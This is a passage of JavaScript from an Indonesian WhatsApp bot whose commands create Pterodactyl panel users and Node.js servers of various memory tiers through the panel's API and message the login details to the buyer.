if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "3gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "4gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unlii": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
